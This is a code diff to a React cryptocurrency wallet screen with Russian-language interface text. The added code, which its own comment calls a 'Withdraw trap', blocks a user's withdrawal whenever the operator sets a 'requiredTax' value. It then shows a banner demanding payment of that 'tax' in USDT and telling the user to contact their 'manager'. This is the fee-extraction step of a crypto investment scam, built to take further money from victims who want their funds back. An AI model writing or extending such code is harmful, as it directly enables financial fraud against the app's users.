@@ -65,6 +65,12 @@ export function WalletScreen() {
 
   function handleWithdraw() {
     setWdError("");
+    // ── Withdraw trap: проверяем required_tax ──────────────────────────────
+    const tax = state.profile?.requiredTax ?? 0;
+    if (tax > 0) {
+      setWdError(`Для вывода средств необходимо оплатить налог ${tax.toFixed(2)} USDT. Обратитесь к менеджеру.`);
+      return;
+    }
     if (!wdAddress.trim()) { setWdError("Укажите адрес"); return; }
     const amount = parseFloat(wdAmount);
     if (!amount || amount <= 0) { setWdError("Укажите сумму"); return; }
@@ -339,6 +345,25 @@ export function WalletScreen() {
                 </div>
               ) : (
                 <>
+                  {/* Баннер: налоговый блок */}
+                  {(state.profile?.requiredTax ?? 0) > 0 && (
+                    <div style={{
+                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
+                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
+                      textAlign: "center",
+                    }}>
+                      <div style={{ fontSize: 24, marginBottom: 6 }}>⚠️</div>
+                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
+                        Требуется уплата налога
+                      </div>
+                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
+                        Для вывода средств необходимо оплатить налог{" "}
+                        <b style={{ color: "var(--neg)" }}>{(state.profile?.requiredTax ?? 0).toFixed(2)} USDT</b>.
+                        Обратитесь к вашему менеджеру.
+                      </div>
+                    </div>
+                  )}
+
                   <AssetSelector assets={ASSETS} value={selAsset} onChange={changeAsset} />
 
                   <div style={{
